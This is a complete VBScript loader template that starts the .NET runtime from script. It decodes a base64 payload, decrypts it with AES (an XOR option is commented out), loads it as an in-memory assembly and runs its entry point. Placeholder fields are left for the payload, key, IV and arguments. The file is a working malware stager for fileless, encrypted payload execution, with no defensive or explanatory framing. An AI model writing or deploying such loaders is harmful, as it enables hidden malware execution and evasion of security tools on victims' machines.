Sub Main()
    Dim host, domain
    Set host = CreateObject("mscoree.CorRuntimeHost")
    Call host.Start()
    Call host.GetDefaultDomain(domain)

    Dim xml
    Set xml = CreateObject("MSXML2.DOMDocument.3.0")

    Dim encElem, encBytes
    Set encElem = xml.createElement("e")
    encElem.dataType = "bin.base64"
    encElem.text = "YOURPAYLOADHERE"
    encBytes = encElem.nodeTypedValue

    Dim keyElem, keyBytes
    Set keyElem = xml.createElement("k")
    keyElem.dataType = "bin.base64"
    keyElem.text = "YOURKEYHERE"
    keyBytes = keyElem.nodeTypedValue

    ' DECRYPT_AES_START
    Dim ivElem, ivBytes
    Set ivElem = xml.createElement("i")
    ivElem.dataType = "bin.base64"
    ivElem.text = "YOURIVHERE"
    ivBytes = ivElem.nodeTypedValue

    Dim oh, aes
    Set oh = domain.CreateInstance("mscorlib", "System.Security.Cryptography.RijndaelManaged")
    Set aes = oh.Unwrap()
    aes.Mode = 1
    aes.Padding = 2
    aes.Key = keyBytes
    aes.IV = ivBytes

    Dim decryptor, clearBytes
    Set decryptor = aes.CreateDecryptor()
    clearBytes = decryptor.TransformFinalBlock(encBytes, CLng(0), CLng(UBound(encBytes) + 1))
    ' DECRYPT_AES_END

    ' DECRYPT_XOR_START
    ' Dim clearBytes
    ' Dim i
    ' Dim xorResult()
    ' ReDim xorResult(UBound(encBytes))
    ' For i = 0 To UBound(encBytes)
    '     xorResult(i) = CByte(encBytes(i) Xor keyBytes(i Mod (UBound(keyBytes) + 1)))
    ' Next
    ' clearBytes = xorResult
    ' DECRYPT_XOR_END

    Dim asm
    Set asm = domain.Load_3(clearBytes)

    Dim entry
    Set entry = asm.get_EntryPoint()

    If Not entry Is Nothing Then
        Dim prms
        Set prms = entry.GetParameters()
        If prms.Length = 0 Then
            entry.Invoke_2 Nothing, Array()
        Else
            entry.Invoke_2 Nothing, Array(Array(YOURARGS))
        End If
    End If
End Sub

Call Main()
